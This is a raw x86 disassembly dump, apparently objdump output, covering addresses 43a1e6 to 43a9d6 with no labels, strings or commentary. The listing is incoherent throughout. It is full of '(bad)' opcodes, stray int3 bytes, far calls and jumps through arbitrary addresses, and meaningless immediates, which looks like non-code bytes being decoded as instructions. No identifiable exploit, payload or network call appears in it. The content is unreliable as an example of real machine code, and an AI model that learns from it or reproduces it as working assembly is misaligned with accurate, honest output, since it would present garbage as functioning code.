  43a1e6:	add    ah,ah
  43a1e8:	call   DWORD PTR [ebx-0x25ab3301]
  43a1ee:	xor    DWORD PTR [edx+0x0],0xffffffe8
  43a1f2:	int3   
  43a1f3:	add    BYTE PTR [eax],ch
  43a1f5:	pop    ebp
  43a1f6:	add    DWORD PTR [edi-0x1],0x1b
  43a1fa:	dec    esp
  43a1fc:	cmp    bh,bl
  43a1fe:	or     DWORD PTR [ecx],0xffffffff
  43a201:	(bad)  
  43a203:	add    BYTE PTR [ebx],ch
  43a205:	cmp    eax,0x5c001a83
  43a20a:	add    BYTE PTR [ebx+0x783c4e5],al
  43a210:	int3   
  43a211:	mov    esi,0x552b0000
  43a216:	dec    DWORD PTR [ecx]
  43a218:	call   FWORD PTR [edx+0x7b04ffff]
  43a21e:	call   FWORD PTR [ecx]
  43a220:	jmp    DWORD PTR [ecx+0x20c18983]
  43a226:	add    BYTE PTR [eax],ah
  43a228:	sbb    edx,0x0
  43a22b:	sbb    DWORD PTR [ecx-0x53],0xffffffcc
  43a22f:	push   es
  43a230:	add    ch,bh
  43a232:	add    BYTE PTR [eax],al
  43a234:	inc    esi
  43a235:	aas    
  43a236:	add    dl,dl
  43a238:	jmp    FWORD PTR [ecx+0x0]
  43a23b:	add    cl,al
  43a23d:	mov    ds:0x5889d700,eax
  43a242:	(bad)  
  43a243:	push   DWORD PTR [edi]
  43a245:	mov    edi,0x9fff4a83
  43a24a:	add    DWORD PTR [ebx-0x4c7ccead],0xffffffcc
  43a251:	inc    BYTE PTR [eax]
  43a253:	sbb    DWORD PTR [ebp-0x76335b],0x19
  43a25a:	inc    DWORD PTR [eax]
  43a25c:	and    edx,ecx
  43a25e:	add    BYTE PTR [ecx-0x767cdf01],bl
  43a264:	sub    DWORD PTR [eax+0x49ccfa89],ebx
  43a26a:	mov    edi,edi
  43a26c:	stos   DWORD PTR es:[edi],eax
  43a26d:	push   esp
  43a26e:	mov    DWORD PTR [ebx+0xff67ff],ecx
  43a274:	xchg   edi,eax
  43a275:	ss (bad) 
  43a277:	mov    esp,0xff003bff
  43a27c:	lea    esp,ds:0x50ff06ff
  43a282:	inc    DWORD PTR [ebx+0x26893fcb]
  43a288:	add    BYTE PTR [ecx],al
  43a28a:	(bad)  
  43a28b:	inc    DWORD PTR [eax+ecx*1-0x7d]
  43a28f:	mov    ah,0xff
  43a291:	test   DWORD PTR [eax],eax
  43a293:	int3   
  43a294:	test   al,0x1d
  43a296:	and    DWORD PTR [ecx+0x0],0x8
  43a29a:	add    bh,bh
  43a29c:	mov    ebp,0xb300ff
  43a2a1:	jp     0x43a22c
  43a2a3:	(bad)  
  43a2a4:	std    
  43a2a5:	test   al,0x83
  43a2a7:	and    eax,DWORD PTR [eax]
  43a2a9:	stc    
  43a2aa:	(bad)  
  43a2ab:	jmp    ecx
  43a2ad:	das    
  43a2ae:	jmp    FWORD PTR [ecx+ecx*4+0x41]
  43a2b2:	(bad)  
  43a2b3:	dec    ebx
  43a2b5:	push   ecx
  43a2b6:	dec    esi
  43a2b8:	add    BYTE PTR [edi+edi*8],dh
  43a2bb:	push   DWORD PTR [ebp-0x7c833380]
  43a2c1:	sar    edi,0x0
  43a2c4:	(bad)  
  43a2c5:	ja     0x43a2c6
  43a2c7:	sub    ecx,DWORD PTR [ecx-0x2d00008b]
  43a2cd:	dec    ebx
  43a2ce:	jmp    DWORD PTR [eax+0x0]
  43a2d1:	lock add BYTE PTR [eax],al
  43a2d4:	sub    edx,DWORD PTR [eax]
  43a2d6:	add    DWORD PTR [ecx-0x7d],0x27
  43a2da:	cmp    edi,0xffffff8b
  43a2dd:	adc    BYTE PTR [eax],al
  43a2df:	aas    
  43a2e0:	add    BYTE PTR [edx],bl
  43a2e2:	dec    DWORD PTR [ecx-0x7c00aaf9]
  43a2e8:	sub    DWORD PTR [eax],0xffffffff
  43a2eb:	add    BYTE PTR [esi],ch
  43a2ed:	rol    DWORD PTR [eax],cl
  43a2ef:	mov    al,0x83
  43a2f1:	int3   
  43a2f2:	add    ah,cl
  43a2f4:	xor    eax,0x1fcc8c
  43a2f9:	sar    bh,1
  43a2fb:	int3   
  43a2fc:	inc    esi
  43a2fd:	and    eax,0xe1ffc600
  43a302:	mov    edi,edi
  43a304:	jp     0x43a36c
  43a306:	jmp    DWORD PTR [eax-0x1]
  43a309:	push   edi
  43a30a:	(bad)  
  43a30b:	jmp    DWORD PTR [eax+0x25]
  43a30e:	add    BYTE PTR [edx],dl
  43a310:	push   edi
  43a312:	add    bh,bh
  43a314:	in     al,dx
  43a315:	push   ss
  43a316:	int3   
  43a317:	adc    al,0x0
  43a319:	and    cl,BYTE PTR [ecx+0x403aff]
  43a31f:	jle    0x43a320
  43a321:	jae    0x43a322
  43a323:	add    BYTE PTR [ebx],ah
  43a325:	test   bh,bh
  43a327:	xchg   BYTE PTR [ebx+0x44830028],al
  43a32d:	adc    al,0xff
  43a32f:	mov    esp,0xcc2983
  43a334:	push   ecx
  43a335:	mov    ch,0xff
  43a337:	retf   
  43a338:	add    BYTE PTR [esi],bh
  43a33a:	add    BYTE PTR [eax],al
  43a33c:	loopne 0x43a330
  43a33e:	(bad)  
  43a33f:	sti    
  43a340:	add    BYTE PTR [edi+0x0],cl
  43a343:	inc    ebx
  43a345:	xor    al,0x0
  43a347:	inc    BYTE PTR [eax]
  43a349:	jmp    0x7d00:0x9a60083
  43a350:	call   ecx
  43a352:	(bad)  
  43a353:	call   DWORD PTR [eax-0x331eff6f]
  43a359:	xor    al,BYTE PTR [eax]
  43a35b:	or     DWORD PTR [ebx+eax*1-0x56002c7d],0xffffffff
  43a363:	add    DWORD PTR [eax+0x3a],0xffffffff
  43a367:	jno    0x43a368
  43a369:	mov    cl,0x83
  43a36b:	add    cl,bh
  43a36d:	mov    ds:0x52ff2fff,al
  43a372:	add    BYTE PTR [eax],al
  43a374:	das    
  43a375:	cmp    al,0xff
  43a377:	(bad)  
  43a379:	pusha  
  43a37a:	mov    DWORD PTR [ebx+0x42ff28ca],eax
  43a380:	inc    DWORD PTR ds:0x7af200ff
  43a386:	call   DWORD PTR [ecx]
  43a388:	add    BYTE PTR [eax+0x730eff00],bl
  43a38e:	push   DWORD PTR [eax]
  43a390:	call   DWORD PTR [edx-0x7d]
  43a393:	jmp    DWORD PTR [edx+0x8930]
  43a399:	rol    BYTE PTR [eax],cl
  43a39b:	(bad)  
  43a39c:	jmp    esi
  43a39e:	mov    DWORD PTR [ecx-0x1],esp
  43a3a1:	or     al,BYTE PTR [eax]
  43a3a3:	add    BYTE PTR [ecx],bl
  43a3a5:	add    DWORD PTR [ebx-0xf633e8],eax
  43a3ab:	add    BYTE PTR [edx-0x13],ch
  43a3ae:	int3   
  43a3af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a3b0:	adc    DWORD PTR [edx],0xffffffff
  43a3b3:	call   FWORD PTR [edi-0x10]
  43a3b6:	call   DWORD PTR [esi]
  43a3b8:	cmp    ecx,0x0
  43a3bb:	inc    DWORD PTR [ebx+0x3a]
  43a3be:	mov    DWORD PTR [edi-0x7c004777],ecx
  43a3c4:	repz cmp BYTE PTR [eax],al
  43a3c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a3c8:	(bad)  
  43a3c9:	clc    
  43a3ca:	add    ah,cl
  43a3cc:	xor    DWORD PTR [edi+edi*8-0x5e],edi
  43a3d0:	jmp    ebx
  43a3d2:	add    bh,bh
  43a3d4:	jge    0x43a3ec
  43a3d6:	jmp    FWORD PTR [edi-0x34]
  43a3d9:	pop    es
  43a3da:	add    DWORD PTR [eax],0xffffffd1
  43a3dd:	push   0x99ffbd00
  43a3e2:	inc    DWORD PTR [eax]
  43a3e4:	jo     0x43a375
  43a3e6:	dec    esp
  43a3e8:	cmp    DWORD PTR [ecx],0xffffffff
  43a3eb:	sub    DWORD PTR [ebp-0xd],0xffffffff
  43a3ef:	lahf   
  43a3f0:	call   DWORD PTR [ebx]
  43a3f2:	inc    DWORD PTR [ebx-0x4b7c630c]
  43a3f8:	(bad)  
  43a3f9:	cmp    BYTE PTR [eax],al
  43a3fb:	add    BYTE PTR ds:0x52ff36,dh
  43a401:	bswap  esp
  43a403:	inc    DWORD PTR [ebp+0x6f]
  43a406:	(bad)  
  43a407:	std    
  43a408:	(bad)  
  43a409:	cld    
  43a40a:	add    bh,bh
  43a40c:	mov    al,0x39
  43a40e:	call   DWORD PTR [ebx+eax*4+0x4e]
  43a412:	(bad)  
  43a413:	call   ebp
  43a415:	add    bh,bh
  43a417:	add    BYTE PTR cs:[ecx+0x0],cl
  43a41b:	jmp    DWORD PTR [ebp*8+0x33cc6b83]
  43a422:	(bad)  
  43a423:	dec    ebx
  43a425:	jb     0x43a426
  43a427:	inc    edi
  43a428:	int3   
  43a429:	sub    cl,ah
  43a42b:	sbb    DWORD PTR [edi+0x45],0x0
  43a42f:	mov    al,0x0
  43a431:	sub    edi,edi
  43a433:	add    BYTE PTR [esi+0x98ff8f],dh
  43a439:	hlt    
  43a43a:	(bad)  
  43a43b:	push   DWORD PTR [edx-0x4a002e]
  43a441:	dec    ebx
  43a442:	(bad)  
  43a443:	(bad)  
  43a444:	jl     0x43a434
  43a446:	(bad)  
  43a447:	mov    eax,0xffff00ff
  43a44c:	sbb    bl,al
  43a44e:	add    BYTE PTR ds:0xffff6900,bl
  43a454:	sub    bh,bh
  43a456:	call   DWORD PTR [edi-0x287d]
  43a45c:	je     0x43a48a
  43a45e:	xor    DWORD PTR [eax],0xffffffff
  43a461:	loop   0x43a463
  43a463:	(bad)  
  43a464:	mov    esp,0x83ceff99
  43a469:	inc    edx
  43a46a:	add    bh,bh
  43a46c:	test   al,0x6c
  43a46e:	add    dl,dl
  43a470:	add    bh,al
  43a472:	dec    DWORD PTR [ecx-0x32002d68]
  43a478:	and    DWORD PTR [ebx-0x227c0100],0xffffff89
  43a47f:	(bad)  
  43a480:	add    BYTE PTR [esi-0x7d],cl
  43a483:	dec    DWORD PTR [esi*1+0x25ffc589]
  43a48a:	add    DWORD PTR [eax],0xffffffae
  43a48d:	scas   eax,DWORD PTR es:[edi]
  43a48e:	mov    DWORD PTR [ebp+0x0],ecx
  43a491:	dec    eax
  43a492:	add    bh,bh
  43a494:	fisttp WORD PTR [esi-0x73ff1701]
  43a49a:	cmp    edi,0x69
  43a49d:	jecxz  0x43a46b
  43a49f:	xchg   ebp,eax
  43a4a0:	call   FWORD PTR [ebp+0x7dcc0000]
  43a4a6:	int3   
  43a4a7:	jp     0x43a4a9
  43a4a9:	xchg   ecx,eax
  43a4aa:	add    BYTE PTR [eax],al
  43a4ac:	push   es
  43a4ad:	popf   
  43a4ae:	call   FWORD PTR [esi-0xff4501]
  43a4b4:	xchg   ecx,eax
  43a4b5:	icebp  
  43a4b6:	add    BYTE PTR [esi-0x1],ah
  43a4b9:	jns    0x43a4ba
  43a4bb:	call   FWORD PTR [edi+ebp*2]
  43a4be:	jmp    DWORD PTR [ebp+0xff8d00]
  43a4c4:	retf   0x833b
  43a4c7:	ss (bad) 
  43a4c9:	mov    esi,0xcb1900ff
  43a4ce:	add    BYTE PTR ds:0xccd483,al
  43a4d4:	add    al,0x33
  43a4d6:	add    BYTE PTR [eax-0x7cff7a34],dl
  43a4dc:	jae    0x43a4a4
  43a4de:	add    ah,ah
  43a4e0:	int3   
  43a4e1:	in     al,dx
  43a4e2:	inc    DWORD PTR [eax]
  43a4e4:	sar    ch,cl
  43a4e6:	push   DWORD PTR [ecx-0x7cc977]
  43a4ec:	js     0x43a4f8
  43a4ee:	call   FWORD PTR [ebp+0xff3f00]
  43a4f4:	hlt    
  43a4f5:	mov    eax,0x50007083
  43a4fa:	inc    DWORD PTR [eax]
  43a4fc:	jmp    0x3ba456
  43a501:	mov    eax,0x448883ff
  43a506:	mov    DWORD PTR [edi+edi*8-0x53ff7cb9],eax
  43a50d:	pop    edx
  43a50e:	jmp    FWORD PTR [esi-0xff6601]
  43a514:	xchg   esp,eax
  43a515:	jnp    0x43a517
  43a517:	lock adc DWORD PTR [eax-0x3b773301],0xffffffff
  43a51f:	mov    al,ds:0xcc83cdff
  43a524:	lods   eax,DWORD PTR ds:[esi]
  43a525:	(bad)  
  43a527:	icebp  
  43a528:	add    DWORD PTR [edi],0x0
  43a52b:	add    cl,ch
  43a52d:	repz jmp FWORD PTR ds:0xff003200
  43a534:	mov    cl,0x65
  43a536:	(bad)  
  43a537:	cli    
  43a538:	jmp    DWORD PTR [ebx]
  43a53a:	add    DWORD PTR [eax],0xffffffeb
  43a53d:	ud0    eax,DWORD PTR [eax-0x33006101]
  43a544:	xor    ebp,DWORD PTR [eax-0x657c2101]
  43a54a:	inc    DWORD PTR [eax]
  43a54c:	cmp    DWORD PTR [edi+0x0],edx
  43a54f:	and    al,BYTE PTR [ebx+0x7e838350]
  43a555:	inc    esp
  43a556:	call   DWORD PTR [esi]
  43a558:	add    BYTE PTR [esi-0x4d5f0001],ch
  43a55e:	call   FWORD PTR [esi-0x1]
  43a561:	xchg   ecx,eax
  43a562:	add    BYTE PTR [ecx+0x66ff0362],cl
  43a568:	jmp    FWORD PTR [ebp+0x61f6ff00]
  43a56e:	xor    DWORD PTR [edx-0x7c002101],0xffffffc1
  43a575:	adc    bh,bh
  43a577:	cdq    
  43a578:	call   DWORD PTR [eax+0x4c558900]
  43a57e:	add    BYTE PTR [ebp-0x1],bl
  43a581:	or     eax,DWORD PTR [eax]
  43a583:	call   FWORD PTR [ebx-0x15ff01]
  43a589:	dec    ebx
  43a58a:	int3   
  43a58b:	call   FWORD PTR [eax]
  43a58d:	and    eax,DWORD PTR [eax]
  43a58f:	pop    esp
  43a590:	add    BYTE PTR [ecx-0x34],ah
  43a593:	inc    DWORD PTR [esi+edx*2]
  43a596:	call   FWORD PTR [esi]
  43a598:	add    cl,dl
  43a59a:	add    BYTE PTR [eax],al
  43a59c:	inc    ebp
  43a59d:	icebp  
  43a59e:	int3   
  43a59f:	push   edi
  43a5a0:	inc    DWORD PTR [ecx-0x382c0001]
  43a5a6:	jmp    FWORD PTR ds:0xffffc7ff
  43a5ac:	aas    
  43a5ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a5ae:	int3   
  43a5af:	mov    esi,0xff895e89
  43a5b4:	scas   eax,DWORD PTR es:[edi]
  43a5b5:	inc    ecx
  43a5b6:	mov    DWORD PTR [edx-0x1],eax
  43a5b9:	fld    QWORD PTR [eax]
  43a5bb:	add    dl,dl
  43a5bd:	inc    edx
  43a5be:	sub    DWORD PTR [esi+0x0],0xc
  43a5c2:	mov    DWORD PTR [eax],eax
  43a5c4:	jb     0x43a5cb
  43a5c6:	add    BYTE PTR [eax],bl
  43a5c8:	int3   
  43a5c9:	adc    DWORD PTR [eax],eax
  43a5cb:	call   DWORD PTR [eax+eiz*4-0x19ffc07d]
  43a5d2:	add    DWORD PTR [ebx-0x31005b48],0x0
  43a5d9:	fadd   DWORD PTR [ebx-0x3366d000]
  43a5df:	mov    ds:0xfffc83,eax
  43a5e4:	add    eax,0x8321ffa5
  43a5e9:	adc    eax,0xb3a8ffcc
  43a5ee:	add    bl,dl
  43a5f0:	jmp    DWORD PTR [ebp+0x0]
  43a5f3:	(bad)  
  43a5f4:	jp     0x43a5d1
  43a5f6:	sbb    DWORD PTR [eax+eax*1],0xffffffb6
  43a5fa:	inc    DWORD PTR [eax]
  43a5fc:	xor    DWORD PTR [ecx-0x66ffbf00],ebx
  43a602:	int3   
  43a603:	add    BYTE PTR [eax+eax*4-0x1],al
  43a607:	dec    ebx
  43a608:	dec    DWORD PTR [ecx]
  43a60a:	inc    DWORD PTR [eax]
  43a60c:	enter  0xcce0,0x39
  43a610:	dec    eax
  43a612:	or     DWORD PTR [ecx-0x7376b6f6],0xffffffff
  43a619:	sbb    al,0x0
  43a61b:	cmp    edi,0x46
  43a61e:	add    BYTE PTR [edi+edi*8+0x65cc0001],bl
  43a625:	pop    ebx
  43a626:	inc    DWORD PTR [ebp-0x76ffda01]
  43a62c:	xchg   esi,eax
  43a62d:	mov    al,0xcc
  43a62f:	test   eax,0xff95ff
  43a634:	fbld   TBYTE PTR [esi-0x7d]
  43a637:	test   bh,bh
  43a639:	add    BYTE PTR ss:[eax],al
  43a63c:	std    
  43a63d:	fild   DWORD PTR [eax]
  43a63f:	sar    edi,0x1e
  43a642:	add    BYTE PTR [eax],al
  43a644:	ss pop ebp
  43a646:	(bad)  
  43a647:	js     0x43a649
  43a649:	and    esp,ecx
  43a64b:	int3   
  43a64c:	inc    eax
  43a64d:	or     eax,0xd283d100
  43a652:	add    BYTE PTR [ebx-0x6c33e596],al
  43a658:	add    BYTE PTR [ebx],dh
  43a65a:	mov    esp,ecx
  43a65c:	mov    ebp,0xffe1ccaf
  43a661:	cmp    al,BYTE PTR [ebx-0xbf8701]
  43a667:	dec    ebx
  43a668:	add    ah,bh
  43a66a:	(bad)  
  43a66b:	(bad)  
  43a66c:	fimul  WORD PTR [ecx-0x7dffcf7d]
  43a672:	inc    DWORD PTR [eax]
  43a674:	scas   eax,DWORD PTR es:[edi]
  43a675:	enter  0xfbff,0x0
  43a679:	cdq    
  43a67a:	add    DWORD PTR [eax],0x6e
  43a67d:	jp     0x43a67e
  43a67f:	xlat   BYTE PTR ds:[ebx]
  43a680:	call   DWORD PTR [edi+edi*8]
  43a683:	mov    DWORD PTR [ebx+eiz*4-0x6500cc01],eax
  43a68a:	(bad)  
  43a68b:	jmp    esp
  43a68d:	add    eax,0x3eff25cc
  43a692:	add    bh,bh
  43a694:	inc    esi
  43a695:	rol    DWORD PTR [eax],0x6d
  43a698:	add    BYTE PTR [edi+edi*8],dl
  43a69b:	push   ebp
  43a69d:	nop
  43a69e:	sbb    DWORD PTR [eax+eax*1+0x61],0xffffffff
  43a6a3:	add    BYTE PTR [ebp-0x5300d5],bh
  43a6a9:	cmp    eax,0xff35cc00
  43a6ae:	add    BYTE PTR [edx],bl
  43a6b0:	call   DWORD PTR [ebp-0x1]
  43a6b3:	jmp    DWORD PTR [ebp-0x7c6800c2]
  43a6b9:	mov    eax,ds:0xe6df00ff
  43a6be:	push   DWORD PTR [edi]
  43a6c0:	jmp    DWORD PTR [ecx]
  43a6c2:	inc    DWORD PTR [eax]
  43a6c4:	mov    BYTE PTR [eax+0x7aff91ff],al
  43a6ca:	add    bh,bh
  43a6cc:	into   
  43a6cd:	sbb    BYTE PTR [eax],al
  43a6cf:	xor    eax,0xff831289
  43a6d4:	xlat   BYTE PTR ds:[ebx]
  43a6d5:	out    dx,al
  43a6d6:	mov    DWORD PTR [esi],esp
  43a6d8:	call   DWORD PTR [eax+0x0]
  43a6db:	int3   
  43a6dc:	imul   esi,DWORD PTR [esi],0xffffffcc
  43a6df:	xchg   edi,eax
  43a6e0:	adc    DWORD PTR [ebp-0x1],0xffffff83
  43a6e4:	jns    0x43a6b9
  43a6e6:	or     DWORD PTR [edx],0xffffffff
  43a6e9:	inc    esp
  43a6ea:	cmp    edi,0x26
  43a6ed:	push   0xadff
  43a6f2:	inc    DWORD PTR [eax]
  43a6f4:	dec    edi
  43a6f5:	push   es
  43a6f6:	jmp    DWORD PTR [ecx]
  43a6f8:	call   FWORD PTR [ebx]
  43a6fa:	add    BYTE PTR [eax],al
  43a6fc:	call   0x83b12abb
  43a701:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a702:	mov    DWORD PTR [ebx-0x4e7c2ea2],eax
  43a708:	add    BYTE PTR [ebp-0xc8c0034],ah
  43a70e:	inc    DWORD PTR ds:0x836583
  43a714:	sub    al,0x95
  43a716:	call   eax
  43a718:	call   DWORD PTR [edi+0x218c00ff]
  43a71e:	mov    DWORD PTR [esi-0x1],eax
  43a721:	imul   eax,DWORD PTR [eax],0xff326583
  43a727:	jmp    0xff44872b
  43a72c:	fs push 0x0
  43a72f:	push   cs
  43a730:	add    BYTE PTR [edi],ch
  43a732:	add    bh,bh
  43a734:	jge    0x43a6f4
  43a736:	jmp    DWORD PTR [edi-0x77]
  43a739:	jo     0x43a6be
  43a73b:	add    BYTE PTR [eax],ah
  43a73d:	mov    WORD PTR [ebx-0x7ccf006e],es
  43a743:	(bad)  
  43a744:	jle    0x43a791
  43a746:	add    DWORD PTR [eax-0x1],0xf
  43a74a:	int3   
  43a74b:	xor    eax,0x55
  43a74e:	add    BYTE PTR [esi+0xccb383],ch
  43a754:	adc    DWORD PTR [edx-0x1],eax
  43a757:	xchg   ebp,eax
  43a758:	add    bh,cl
  43a75a:	add    BYTE PTR [eax],al
  43a75c:	ror    DWORD PTR [edi+edi*8],1
  43a75f:	aaa    
  43a760:	mov    DWORD PTR [edi],ebp
  43a762:	inc    DWORD PTR [eax]
  43a764:	fistp  WORD PTR [edi]
  43a766:	cmp    DWORD PTR [edx-0xff317d],0xfffffff8
  43a76d:	pop    DWORD PTR [eax]
  43a76f:	iret   
  43a770:	and    DWORD PTR [ecx+ecx*4],0xffffffff
  43a774:	ret    
  43a775:	repnz int3 
  43a777:	(bad)  
  43a778:	inc    DWORD PTR ds:0xfc48983
  43a77e:	add    BYTE PTR [edx-0x1],dl
  43a781:	add    DWORD PTR [ebx+0x286100],0xfff3ff70
  43a78b:	sub    edx,0x54
  43a78e:	add    BYTE PTR [esi+0x0],ch
  43a791:	add    DWORD PTR ds:[eax],0xffffffe3
  43a795:	add    BYTE PTR fs:[ecx],bh
  43a798:	(bad)  
  43a799:	cld    
  43a79a:	(bad)  
  43a79b:	jmp    FWORD PTR [ecx]
  43a79d:	xor    bh,bh
  43a79f:	or     al,0x89
  43a7a1:	test   al,0xff
  43a7a3:	add    dl,ah
  43a7a5:	out    0x0,al
  43a7a7:	cmp    bh,0x58
  43a7aa:	add    bh,bh
  43a7ac:	and    al,BYTE PTR [eax-0x4d33527d]
  43a7b2:	inc    DWORD PTR [ebx-0x48338f4e]
  43a7b8:	add    BYTE PTR [ebx-0x6adfff34],dh
  43a7be:	(bad)  
  43a7bf:	mov    eax,0x81cc
  43a7c4:	mov    WORD PTR [esi-0x77],es
  43a7c7:	xor    eax,0xffb8ff
  43a7cc:	sahf   
  43a7cd:	pop    edx
  43a7ce:	int3   
  43a7cf:	adc    eax,0xffe2ff
  43a7d4:	sti    
  43a7d5:	mov    cl,0x0
  43a7d7:	ja     0x43a7d9
  43a7d9:	add    edi,edi
  43a7db:	dec    DWORD PTR [esp+eax*1-0x2476db01]
  43a7e2:	add    BYTE PTR [ecx+0xb00982b],cl
  43a7e8:	jmp    DWORD PTR [edi+edi*8+0x568100]
  43a7ef:	cli    
  43a7f0:	add    BYTE PTR [ecx+0x5f4bcccc],ah
  43a7f6:	add    BYTE PTR [edx-0xe700],dl
  43a7fc:	nop
  43a7fd:	mov    ds:0xf80059ff,al
  43a802:	inc    DWORD PTR [ebx-0x70ff0d9e]
  43a808:	jmp    ebp
  43a80a:	add    bh,bh
  43a80c:	outs   dx,BYTE PTR ds:[esi]
  43a80d:	int3   
  43a80e:	mov    DWORD PTR [esi-0x33ffe800],ecx
  43a814:	inc    edx
  43a815:	mov    bl,0xff
  43a817:	loope  0x43a79c
  43a819:	push   esi
  43a81a:	(bad)  
  43a81b:	call   DWORD PTR [esi+0x5c]
  43a81e:	add    BYTE PTR [edi],dh
  43a820:	int3   
  43a821:	fild   WORD PTR [ebx+0x9be1ff]
  43a827:	add    eax,DWORD PTR [ebx+0x7ff0044]
  43a82d:	lods   eax,DWORD PTR ds:[esi]
  43a82e:	call   FWORD PTR [edx-0x2b01]
  43a834:	jg     0x43a835
  43a836:	(bad)  
  43a837:	jmp    0x442bbf
  43a83c:	ja     0x43a88e
  43a83e:	add    BYTE PTR [edi-0x77],ah
  43a841:	push   esp
  43a842:	add    bh,bh
  43a844:	mov    ebp,0x59007f
  43a849:	fadd   QWORD PTR [eax]
  43a84b:	cmp    DWORD PTR ds:0x458922,0x70
  43a852:	inc    DWORD PTR [ebx+0x40ff867c]
  43a858:	add    BYTE PTR [edx-0x7d],cl
  43a85b:	dec    DWORD PTR [edx-0x48]
  43a85e:	call   DWORD PTR [eax]
  43a860:	add    BYTE PTR [edi+edi*8+0xfc5883],bl
  43a867:	inc    edi
  43a868:	add    BYTE PTR [esi-0x1],bh
  43a86b:	call   DWORD PTR [esi]
  43a86d:	dec    eax
  43a86e:	dec    DWORD PTR [ecx]
  43a870:	(bad)  
  43a871:	cmp    eax,0xc3ce00ff
  43a876:	inc    eax
  43a878:	(bad)  
  43a879:	fdivr  st,st(7)
  43a87b:	jmp    DWORD PTR [eax+eiz*4]
  43a87e:	add    BYTE PTR [eax-0x7d],dh
  43a881:	sar    edi,1
  43a883:	add    ch,dh
  43a885:	mov    ah,0x0
  43a887:	push   edx
  43a888:	add    al,bl
  43a88a:	add    bh,bh
  43a88c:	icebp  
  43a88d:	call   0xff83:0x61009083
  43a894:	rcr    BYTE PTR [esi-0x1],0x65
  43a898:	cmp    DWORD PTR [edx-0x1],0x0
  43a89c:	pop    ss
  43a89d:	cmp    edi,edi
  43a89f:	inc    DWORD PTR es:[ebx-0x698e0100]
  43a8a6:	or     DWORD PTR [eax],0xffffff83
  43a8a9:	xchg   ecx,eax
  43a8aa:	(bad)  
  43a8ab:	push   DWORD PTR [ebx-0xaaffa4]
  43a8b1:	and    BYTE PTR [eax],al
  43a8b3:	(bad)  
  43a8b4:	cmp    al,0x38
  43a8b6:	add    BYTE PTR [ecx+ecx*4-0x26],dl
  43a8ba:	add    bh,bh
  43a8bc:	out    dx,al
  43a8bd:	and    BYTE PTR [eax],al
  43a8bf:	adc    eax,0xcc24ff
  43a8c4:	jg     0x43a90a
  43a8c6:	sub    esp,0xffffffff
  43a8c9:	dec    ecx
  43a8ca:	inc    DWORD PTR [ebx-0x47767867]
  43a8d0:	int3   
  43a8d1:	arpl   di,di
  43a8d3:	jmp    FWORD PTR [edi]
  43a8d5:	scas   al,BYTE PTR es:[edi]
  43a8d6:	call   FWORD PTR [ebx-0x4477]
  43a8dc:	xor    eax,0x89f3001d
  43a8e1:	push   esi
  43a8e2:	add    bh,bh
  43a8e4:	pop    esp
  43a8e5:	or     al,BYTE PTR [eax]
  43a8e7:	stos   DWORD PTR es:[edi],eax
  43a8e8:	inc    ecx
  43a8ea:	add    bh,bh
  43a8ec:	fs adc bh,bh
  43a8ef:	sbb    eax,DWORD PTR [eax]
  43a8f1:	mov    bh,0xcc
  43a8f3:	call   ecx
  43a8f5:	push   ecx
  43a8f6:	push   DWORD PTR [ebx]
  43a8f8:	push   DWORD PTR [edi]
  43a8fa:	add    bh,bh
  43a8fc:	inc    ebp
  43a8fd:	and    al,BYTE PTR [ebx-0x4affa2]
  43a903:	call   FWORD PTR [eax-0x43]
  43a906:	int3   
  43a907:	test   DWORD PTR [eax],0xbb00ff96
  43a90d:	aad    0x0
  43a90f:	jo     0x43a8dd
  43a911:	jp     0x43a913
  43a913:	push   DWORD PTR [edi-0x2]
  43a916:	inc    DWORD PTR [edi+edi*8]
  43a919:	sub    bh,bh
  43a91b:	dec    DWORD PTR [ecx-0x2a]
  43a91e:	(bad)  
  43a91f:	mov    ebp,0x8383a500
  43a924:	(bad)  
  43a925:	mov    al,0x0
  43a927:	ja     0x43a8ac
  43a929:	adc    edi,edi
  43a92b:	add    BYTE PTR [edx-0x33347ce7],ah
  43a931:	mov    BYTE PTR [eax],al
  43a933:	inc    DWORD PTR [esi-0x3302ff35]
  43a939:	test   DWORD PTR [ebx-0x332d4a01],eax
  43a93f:	std    
  43a940:	jmp    FWORD PTR [ecx-0x56b30001]
  43a946:	int3   
  43a947:	out    dx,al
  43a948:	add    BYTE PTR [eax+eax*1+0x19ec89],cl
  43a94f:	pop    ebp
  43a950:	inc    DWORD PTR [ebx-0x24230000]
  43a956:	int3   
  43a957:	jmp    0x43a958
  43a959:	sub    al,0xff
  43a95b:	jmp    DWORD PTR ds:0x4f0039
  43a961:	add    bh,bh
  43a963:	add    bh,dh
  43a965:	test   DWORD PTR [eax],eax
  43a967:	and    al,0xff
  43a969:	fiadd  DWORD PTR [eax]
  43a96b:	int3   
  43a96c:	fidivr WORD PTR [eax-0x10ff0100]
  43a972:	inc    DWORD PTR [eax]
  43a974:	dec    ebx
  43a975:	jmp    DWORD PTR es:[edi-0xa301]
  43a97c:	cli    
  43a97d:	test   DWORD PTR [eax],eax
  43a97f:	cs (bad) 
  43a981:	stc    
  43a982:	inc    DWORD PTR [ebx+0x57831ee3]
  43a988:	add    cl,ch
  43a98a:	inc    DWORD PTR [eax]
  43a98c:	mov    ?,WORD PTR ds:0x27004bff
  43a992:	dec    esp
  43a994:	(bad)  
  43a995:	sar    edi,1
  43a997:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a998:	mov    DWORD PTR [edi+0x2d79ff89],edx
  43a99e:	add    bh,bl
  43a9a0:	mov    esi,ecx
  43a9a2:	add    DWORD PTR [eax],0xffffff9e
  43a9a5:	push   ss
  43a9a6:	add    BYTE PTR ds:0xffffcf83,dh
  43a9ac:	sahf   
  43a9ad:	aad    0xff
  43a9af:	xchg   esi,eax
  43a9b0:	jmp    DWORD PTR [ebx-0x1]
  43a9b3:	dec    DWORD PTR [esi+eax*2+0x3008789]
  43a9ba:	inc    DWORD PTR [eax]
  43a9bc:	push   ebp
  43a9bd:	idiv   bh
  43a9bf:	cmp    bh,bh
  43a9c1:	xchg   esp,eax
  43a9c2:	(bad)  
  43a9c3:	inc    edi
  43a9c5:	fs (bad) 
  43a9c7:	jnp    0x43a9c8
  43a9c9:	cmc    
  43a9ca:	add    ah,cl
  43a9cc:	fnstcw WORD PTR [eax]
  43a9ce:	push   DWORD PTR [esi]
  43a9d0:	call   FWORD PTR [ecx+0x15d9ffcc]
  43a9d6:	add    dh,dh
